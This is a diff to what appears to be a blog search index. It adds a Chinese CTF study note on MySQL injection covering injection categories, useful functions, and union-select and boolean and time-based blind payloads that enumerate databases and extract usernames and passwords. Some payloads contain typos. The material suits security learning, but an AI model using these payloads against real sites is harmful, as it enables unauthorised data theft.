@@ -3,6 +3,72 @@
   
     
     <entry>
+      <title><![CDATA[MySql 注入杂记]]></title>
+      <url>/2017/10/06/mysql/</url>
+      <content type="html"><![CDATA[<p><img src="http://ourd90bac.bkt.clouddn.com/mysql.jpg" alt=""></p>
+<h3 id="1-基础知识准备："><a href="#1-基础知识准备：" class="headerlink" title="1.基础知识准备："></a>1.基础知识准备：</h3><h4 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h4><ul>
+<li><p>基于从服务器的响应：<br>1.基于错误的sql注入；<br>2.联合查询的类型；</p>
+<a id="more"></a>
+<p>3.SQL盲注：</p>
+<pre><code>基于布尔的盲注
+基于时间的盲注
+基于报错的盲注
+</code></pre></li>
+<li><p>基于注入的数据类型：<br>1.基于字符串<br>2.基于数字</p>
+</li>
+<li><p>基于程度和顺序<br>1.一阶注入；<br>2.二阶注入；<br>3.</p>
+</li>
+<li>基于注入位置<br>1.基于用户输入表单域的注入；<br>2.通过cookie注入；<br>3.通过服务器变量注入。（基于头部信息注入）</li>
+</ul>
+<h4 id="MySQL系统函数"><a href="#MySQL系统函数" class="headerlink" title="MySQL系统函数"></a>MySQL系统函数</h4><p>1.version() :mysql版本信息<br>2.user():数据库用户名<br>3.database():数据库名<br>4.@@datadir():数据库路径<br>5.@@version_compile_os():操作系统版本</p>
+<h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><p>1.concat(str1,str2,….):没有分隔符地连接字符串<br>2.concat_ws(separator.str1,str2,…)含有分隔符地连接字符串<br>3.group_concat(str1,str2,…):连接一族所有的字符串，并用逗号分隔</p>
+<h3 id="2-GET联合查询（有回显报错）"><a href="#2-GET联合查询（有回显报错）" class="headerlink" title="2.GET联合查询（有回显报错）"></a>2.GET联合查询（有回显报错）</h3><p>1.测试<code>id</code>值后的闭合符号，以及注释符。</p>
+<blockquote>
+<p>常见注释：<br>–+<br>#<br>`</p>
+</blockquote>
+<p>2.<code>order by</code>联合查询，找出相应的列数</p>
+<p>3.<code>union select</code>联合查询注入。如下：</p>
+<p><strong>查询所有数据库</strong>：<code>id=-1&#39; union select 1, group_concat(table_schema),3 from information_schema.schemata--+</code></p>
+<p>注：这里我们假设查询出<code>security</code>数据库</p>
+<p><strong>查询表名（table）</strong>：<code>id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
+<p><strong>查询列名（column）</strong>：<code>id=-1&#39; union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
+<p><strong>查询字段名</strong>：<code>id=-1 union select 1,username,password from users where id=2--+</code></p>
+<p>###3. 盲注的相关知识</p>
+<ul>
+<li>基于布尔盲注—–构造逻辑结构判断</li>
+</ul>
+<p>相关字符串截取函数：<br>1.<code>left(database(),1)&gt;&#39;s&#39;</code>   ：database()显示数据库名，left(a,b)从左侧截取a的前b位<br>2.<code>ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1)1,1)--+</code>：substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。<br>3.<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
+BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字符串a的c位。ord()函数和ascii()函数一样将字符转为ascii码。</p>
+<ul>
+<li>基于报错的MySQL盲注</li>
+<li>基于时间的盲注<br><code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code>if(a,b,c)若a成立，就执行c，不成立就执行b</li>
+</ul>
+<h3 id="GET布尔盲注"><a href="#GET布尔盲注" class="headerlink" title="GET布尔盲注"></a>GET布尔盲注</h3><ul>
+<li><p>判断数据库<br>可以使用两种函数判断：<br>1.<code>id=1&#39; and left(database(),1)=&#39;s&#39;--+</code>：直接判断数据库的名字，缺点就是受限于left函数的用法，不能进行每一位的单个字符的判断。<br>2.<code>id=1&#39; and ascii(substr(database(),1,1))=89--+</code>：和上面的语句一样用于判断数据库名，在使用脚本时用此句就行。</p>
+</li>
+<li><p>爆数据库下的表名<br><code>id=1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=136--+</code><br><em>解释</em>：<code>limit 0,1</code>中0是表示从第一个表（若数据库有多个表）开始，接着的1表示获取第一个。</p>
+</li>
+<li><p>获取字段内的值（获取字段名就和上面获取表名的操作是一样的）<br>假设我们从上一步的操作中获取了一个名叫<code>users</code>的字段，一般想来这个字段中肯定含有我们想要得到的用户名和密码，所以这里就可以用到正则注入。</p>
+</li>
+</ul>
+<p>1.<code>id=1&#39; and 1=(select 1 frominformation schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+</code></p>
+<p><strong>注意</strong>：select后的1表示我们查询的是这个字段的第一个值，若我们想查询其他字段中的值，直接更换这里的’users’即可，所以这里的limit 0,1起不到限定作用，可有可无。</p>
+<p>2.使用<code>ord()</code>与<code>mid()</code>函数</p>
+<p>解释：这里的mid()函数与substr()函数类似，有一样的功能。函数原型为：<code>MID(ColumnName, Start [, Length])</code>对字符串从start位置开始截取相应的长度。这里我就可以在substr()被禁的情况下做替换。</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Blackb0x 服务器渗透]]></title>
       <url>/2017/08/16/Blackb0x-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F/</url>
       <content type="html"><![CDATA[<h1 id="一次虚拟机服务器的内网渗透"><a href="#一次虚拟机服务器的内网渗透" class="headerlink" title="一次虚拟机服务器的内网渗透"></a>一次虚拟机服务器的内网渗透</h1><p><img src="http://ourd90bac.bkt.clouddn.com/timg.jpg" alt=""></p>
